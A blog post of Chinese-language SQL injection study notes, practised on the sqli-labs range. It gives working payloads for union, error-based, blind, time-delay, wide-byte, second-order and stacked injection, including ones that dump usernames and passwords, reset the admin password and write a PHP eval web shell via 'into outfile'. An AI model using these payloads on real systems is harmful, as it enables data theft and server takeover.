@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="记录一些sql注入的笔记.. 大佬轻喷參考:  kyx599的博客 Dejavu的博客">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入笔记">
+<meta property="og:url" content="http://atsud0.me/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="记录一些sql注入的笔记.. 大佬轻喷參考:  kyx599的博客 Dejavu的博客">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_180818.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_213319.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_212409.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_095459.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_101723.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200513_092916.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_211423.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_211530.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_211653.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200512_211835.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200510_143304.jpg">
+<meta property="article:published_time" content="2020-05-15T12:19:59.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.456Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="sql_injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_180818.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sql注入笔记 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-15 20:19:59" itemprop="dateCreated datePublished" datetime="2020-05-15T20:19:59+08:00">2020-05-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录一些sql注入的笔记.. 大佬轻喷<br>參考:</p>
+<ul>
+<li><a href="https://www.cnblogs.com/kyx599/articles/12345471.html" title="" target="">kyx599的博客</a></li>
+<li><a href="https://sqlmap.wiki/docs/web%E5%AE%89%E5%85%A8/sqli/" title="" target="">Dejavu的博客</a>
+<a id="more"></a>
+
+</li>
+</ul>
+<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>sql注入就是用户输入的值没有经过严格的过滤却被带进了数据库中当成了数据库语句去执行从而导致的漏洞.</p>
+<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p><code>information_schema</code>mysql5.0版本之后才有的</p>
+<p>三个重点表<code>schemata,tables,columns</code></p>
+<ul>
+<li>schemata   数据库信息</li>
+</ul>
+<p>重点字段：</p>
+<pre><code>schema_name 数据库名字</code></pre><ul>
+<li>tables     数据表信息</li>
+</ul>
+<p>重点字段：</p>
+<pre><code>table_name  数据表名字
+table_schema 数据库名字</code></pre><ul>
+<li>columns    列的信息</li>
+</ul>
+<p>重点字段：</p>
+<pre><code>table_name  数据表名字
+table_schema 数据库名字
+column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
+<p>获取数据库版本<code>version()</code></p>
+<p>获取数据库绝对路径<code>@@datadir</code></p>
+<p>获取当前连接数据库的用户<code>user()</code></p>
+<p>获取当前数据库<code>database()</code></p>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>联合查询步骤：</p>
+<ol>
+<li><p>判断注入点</p>
+<ul>
+<li>?id=1 and 1=2</li>
+<li>?id=1 or 1=1</li>
+<li>直接上order by ?id=1 order by 33333</li>
+</ul>
+</li>
+<li><p>判断闭合情况 </p>
+<ul>
+<li>?id=1’ –+</li>
+<li>?id=1” –+</li>
+<li>在不考虑圆括号的情况下,单引号闭合插入双引号不会报错,双引号闭合中插入单引号不会报错.数字型插什么都报错</li>
+</ul>
+</li>
+<li><p>判断查询字段数</p>
+<ul>
+<li>order by 1 正常</li>
+<li>order by 10 (给个较大的数,通过二分法逐渐判断)</li>
+</ul>
+</li>
+<li><p>判断显示位：</p>
+<ul>
+<li>?id=-1 union select 1,2,3(id一定要给个无效的参数,否则不会正确显示显示位)</li>
+</ul>
+</li>
+<li><p>[判断mysql版本]</p>
+<ul>
+<li>version()</li>
+</ul>
+</li>
+<li><p>[获取全部数据库名字]</p>
+<ul>
+<li>union select 1,group_concat(schema_name),3 from information_schema.schemata</li>
+</ul>
+</li>
+<li><p>获取当前数据库下所有的表名</p>
+<ul>
+<li>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</li>
+</ul>
+</li>
+<li><p>判断关键表(users)的列名</p>
+<ul>
+<li>union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=’users’</li>
+</ul>
+</li>
+<li><p>获取数据</p>
+<ul>
+<li>union select 1,group_concat(username),group_concat(password) from users</li>
+</ul>
+</li>
+</ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入不需要改<code>?id=-1</code><br>只有联合查询需要<br>报错注入,不值这两条语句,还有其他的.</p>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><code>extractvalue(arg1,arg2)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arg1 string格式</span><br><span class="line">arg2 Xpath格式</span><br><span class="line"></span><br><span class="line">and extractvalue(1,concat(0x7e,(select version()),0x7e))</span><br><span class="line"></span><br><span class="line">最大长度限制32位</span><br></pre></td></tr></table></figure>
+
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><code>updatexml(arg1,arg2,arg3)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arg1为xml文档对象的名称</span><br><span class="line">arg2为xpath格式的字符串</span><br><span class="line">arg3为string格式，替换查找到的符合条件的数据</span><br><span class="line">and updatexml(1,concat(0x7e,(select version()),0x7e),1)</span><br><span class="line"></span><br><span class="line">最大长度限制32位</span><br></pre></td></tr></table></figure>
+
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h2 id="报错注入步骤"><a href="#报错注入步骤" class="headerlink" title="报错注入步骤"></a>报错注入步骤</h2><ol>
+<li><p>判断引号闭合情况</p>
+</li>
+<li><p>获取所有数据库名字</p>
+<ul>
+<li><p>and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata ),0x7e))</p>
+</li>
+<li><p>and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata ),0x7e),1)</p>
+</li>
+</ul>
+</li>
+<li><p>获取当前数据库下所有表名</p>
+<ul>
+<li><p>and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))</p>
+</li>
+<li><p>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</p>
+</li>
+</ul>
+</li>
+<li><p>获取列名</p>
+<ul>
+<li><p>and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x7e))</p>
+</li>
+<li><p>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x7e),1)</p>
+</li>
+</ul>
+</li>
+<li><p>获取数据</p>
+<ul>
+<li><p>and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e))</p>
+</li>
+<li><p>and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e))</p>
+</li>
+<li><p>and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)</p>
+</li>
+<li><p>and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><p>用到的函数</p>
+<ul>
+<li>length() 判断长度</li>
+<li>ascii() 读取ascii码表</li>
+<li>substr(string,start,length) 截取字符串</li>
+<li>count(*)计数</li>
+</ul>
+<p>布尔注入是盲测，指你只能通过默认的回显页面去判断，并一步步拆解结果。步骤繁琐。较为困难…</p>
+<h2 id="布尔注入步骤"><a href="#布尔注入步骤" class="headerlink" title="布尔注入步骤"></a>布尔注入步骤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">一、判断引号闭合</span><br><span class="line">二、获取数据库名字</span><br><span class="line">先得到数据库名的长度</span><br><span class="line">and length(database())&gt;5</span><br><span class="line">判断数据库名字的字符</span><br><span class="line">and ascii(substr(database(),1,1))&gt;97 --+</span><br><span class="line"></span><br><span class="line">三、判断当前数据库表数量</span><br><span class="line">and (select count(*) from information_schema.tables where table_schema&#x3D;database())&gt;5</span><br><span class="line">四、判断当前数据库表长度</span><br><span class="line">and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&gt;5</span><br><span class="line">五、猜解表名</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;97  </span><br><span class="line">limit 0,1 </span><br><span class="line">substr 1,1</span><br><span class="line">六、获取列的数量</span><br><span class="line">and (select count(*) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;)&gt;5</span><br><span class="line">七、获取每个列的长度</span><br><span class="line">and (select length(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1)&gt;5</span><br><span class="line">八、获取每个列的名字</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;97  </span><br><span class="line">八、获取数据</span><br><span class="line">获取第一个用户名的长度</span><br><span class="line">and (select length(username) from users limit 0,1)&gt;5</span><br><span class="line">猜解用户名的每个字符</span><br><span class="line">and ascii(substr((select username from users limit 0,1),1,1))&gt;97</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="时间延迟注入"><a href="#时间延迟注入" class="headerlink" title="时间延迟注入"></a>时间延迟注入</h1><p>时间延迟注入要用到的函数</p>
+<ul>
+<li>if(arg1,arg2,arg3)</li>
+<li>sleep(arg1) (秒为单位)</li>
+<li>benchmark(arg1,arg2)</li>
+</ul>
+<h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p><code>and if(payload,sleep(5),1)</code></p>
+<p>如果时间正确则延迟五秒</p>
+<h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h2><p><code>and if(payload,benchmark(50000000,md5(&#39;abc&#39;)),1)</code><br>延迟10秒左右,加密5千万次</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="字符编码集"><a href="#字符编码集" class="headerlink" title="字符编码集"></a>字符编码集</h2><ul>
+<li>ASCII码(单字节编码 第一位取0 如果取1那就是高位ASCII)</li>
+<li>GBK编码(中文编码) gbk2个字节=1个汉字</li>
+<li>UTF8(Unicode),Unicode完全兼容ASCII,UTF-8变长编码,根据不同的符号来变化长度 urf8 3个字节=1个汉字</li>
+</ul>
+<p>UTF8规定一个英文字符用一个字节,一个中文字符用三个字节表示</p>
+<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>URL编码进制用的是是 ASCII 16进制<br>URL编码只解一次<br>八个二进制位和2个16进制位表示的值是一样的</p>
+<p>要用到的函数</p>
+<ul>
+<li>addslashes()函数 转义函数</li>
+</ul>
+<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p><strong>要求数据库编码方式:GBK</strong></p>
+<p>如果数据库编码为GBK时,那么一个GBK汉字就占两个字节,遇到连续两个字节,都符合GBK取值范围,则会自动解释成汉字.</p>
+<p>当使用Addslashes函数防止sql注入时,将传入参数值进行转义.当输入<code>&#39;</code>时,那么就会被自动转义成<code>\&#39;</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200511_180818.jpg" alt="addslashes"></p>
+<p>结合前面所说的URL编码都是16进制的ASCII码,%5c对应ASCII码的<code>\</code>,我们所要考虑的就是将<code>\</code>转义掉,让我们的单引号逃逸.</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200511_213319.jpg" alt="man"></p>
+<p>两个十六进制位则占一个字节,GBK编码遇到连续的两个字节则会解释成汉字,所以如果我们输入一个大于128的十六进制位那么<code>%df</code>就会被转义的单引号<code>\&#39;</code>的<code>\</code>进行结合被解释成一个汉字,从而造成单引号逃逸<br><img src="https://images.atsud0.me/images/post/Screenshot_20200511_212409.jpg" alt="sddd"></p>
+<p>为什么要大于128?因为ascii已经占用了128个标准的字符了,所以要大于128.(十进制大于128),所以不管是<code>%df</code>还是<code>%cf</code> 只要这个的十六进制值换算后的十进制值大于128那么就能组合成汉字</p>
+<p>使用<code>mysqli_real_escape_string</code>转义用户输入的内容时,要预先设置好数据库编码方式,如果不设置,那么这个函数就不会很好的发挥它的效果.</p>
+<h2 id="宽字节注入防御方式"><a href="#宽字节注入防御方式" class="headerlink" title="宽字节注入防御方式"></a>宽字节注入防御方式</h2><ol>
+<li>魔术引号(5.2后版本舍弃)</li>
+<li>mysql_set_charset(‘GBK’)#根据数据库编码设置    <ol>
+<li>mysqli_real_escape_string 转义用户输入</li>
+</ol>
+</li>
+<li>使用addslashes()函数</li>
+<li>正则匹配后替换</li>
+</ol>
+<h1 id="二次解码注入"><a href="#二次解码注入" class="headerlink" title="二次解码注入"></a>二次解码注入</h1><p>因为URL编码只在后端进行一次解码,造成了引号逃逸</p>
+<p>原理:<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_095459.jpg" alt="twice"></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200512_101723.jpg" alt="1"></p>
+<p>%2527</p>
+<h1 id="二次注入-存储型注入"><a href="#二次注入-存储型注入" class="headerlink" title="二次注入(存储型注入)"></a>二次注入(存储型注入)</h1><p>攻击者构造的恶意数据被存储在数据库后,恶意数据被存入数据库,但是数据库只会存储没有功能性的字符.<br>取并进入到sql查询语句所导致的注入.</p>
+<p>原理<img src="https://images.atsud0.me/images/post/Screenshot_20200513_092916.jpg" alt="double"></p>
+<p>如<code>sqli-less24</code>靶场,默认是一个登录界面,如何进行二次注入.<br>先尝试注册一个用户名,测试<code>admin&#39;#&#39;&#39;</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211423.jpg" alt="aa"></p>
+<p>修改密码,当前密码可以不用输入.可以看到已经修改成功了,以为着admin的密码已经被修改了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211530.jpg" alt="ww"></p>
+<p>成功登录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211653.jpg" alt="a"></p>
+<p>为什么呢,我们可以查看源代码,<code>pass_change.php</code>观察红线所划出的两行<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_211835.jpg" alt=""></p>
+<p>其中第一行<code>$username=($_SESSION[&quot;username&quot;]);</code>没有对用户名进行转义,而我们用户名为<code>admin&#39;#&#39;&#39;</code>而<code>#</code>在sql语句中是注释的意思,所以如果没有对<code>$username</code>进行转义的话,那么我们的数据库在后端操作红线划出的第二行的sql执行语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure>
+<p>会在数据库被解释为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password&#x3D;&#39;a&#39; where username&#x3D;&#39;admin&#39;#&#39;&#39;&#39; and password&#x3D;&#39;&#39;....</span><br></pre></td></tr></table></figure>
+<p>在<code>#</code>号后面的已经无关紧要了,因为后面的语句已经被注释掉了.所以这一段sql语句会被执行成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password&#x3D;&#39;a&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>核心思想:同时执行多条语句,mysql语句<code>;</code>号结尾</p>
+<ul>
+<li>局限1:API限制</li>
+<li>局限2:数据库引擎</li>
+<li>局限3:权限不足</li>
+</ul>
+<p>以<code>sqli-less38</code>靶场为例</p>
+<p>先判断闭合等方式就不说了,当确认可以注入之后就可以了,执行我们的修改语句重点在于每一句的语句之后都要分号结尾,否则不成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3;update users set password&#x3D;&#39;b&#39; where username&#x3D;&#39;admin&#39;; #</span><br></pre></td></tr></table></figure>
+
+<p><code>sqli-less39</code>关同理,只是闭合方式不一样</p>
+<h1 id="DNS-log注入"><a href="#DNS-log注入" class="headerlink" title="DNS log注入"></a>DNS log注入</h1><h1 id="基于http头部的SQL注入"><a href="#基于http头部的SQL注入" class="headerlink" title="基于http头部的SQL注入"></a>基于http头部的SQL注入</h1><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>使用burpsuite抓包,修改cookie值,要注意闭合</p>
+<h2 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h2><p>使用burpsuite抓包,修改referer值,要注意闭合</p>
+<h2 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h2><p>使用burpsuite抓包,修改user-agent值,要注意闭合</p>
+<h1 id="Mysql文件读写"><a href="#Mysql文件读写" class="headerlink" title="Mysql文件读写"></a>Mysql文件读写</h1><blockquote>
+<p>在数据库用户权限足够,并且开启了特定配置的时候,我们可以尝试利用这个来对文件进行读(获取目标机器上的部分信息)写(直接拿shell)</p>
+</blockquote>
+<h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>用于写一句话</p>
+<p>要求配置:</p>
+<ul>
+<li><code>secure_file_priv</code> 限制用户读写文件的选项</li>
+</ul>
+<p>查看当前值设置</p>
+<p><code>show variables like &#39;%secure_file%&#39;</code></p>
+<ul>
+<li>为空时 没有限制</li>
+<li>一个目录时:只能在那个目录中导入导出(这个目录必须存在)</li>
+<li>为NULL 禁止导入导出</li>
+</ul>
+<p><code>max_allowed_packet</code> 限制接收数据包的大小</p>
+<p>临时设置:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global max_allowed_packet 1024*1024*1024</span><br></pre></td></tr></table></figure>
+<p>永久修改:</p>
+<pre><code>修改my.ini</code></pre><p>sqli-less-7<br><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[a])?&gt;&#39; into outfile &quot;绝对路径&quot; --+</code> <strong>注意闭合</strong></p>
+<p>这个路径可以不在网站根目录下(看具体设置,最好不要写在C盘,因为要额外设置权限,但是一般都不会给mysqlC盘其他位置的写入权限把…)</p>
+<h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p><code>load_file(file_name)</code><br>读取文件并返回该文件的内容作为一个字符串</p>
+<p>使用条件:</p>
+<ul>
+<li>A:有权限读取并且完全可读</li>
+<li>B:读取文件必须在服务器上</li>
+<li>C:必须指定文件的绝对路径</li>
+<li>D:读取文件大小必须小于<code>max_allowed_packet</code></li>
+</ul>
+<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>实际上没什么机会能用到的</p>
+<p>username:<code>&#39; or 1=1 --</code><br>password:<code>&#39; or 1=1 --</code></p>
+<h1 id="死活爆破不出列名，只知道表名，要怎么进行注入"><a href="#死活爆破不出列名，只知道表名，要怎么进行注入" class="headerlink" title="死活爆破不出列名，只知道表名，要怎么进行注入?"></a>死活爆破不出列名，只知道表名，要怎么进行注入?</h1><p>偏移注入（待填坑</p>
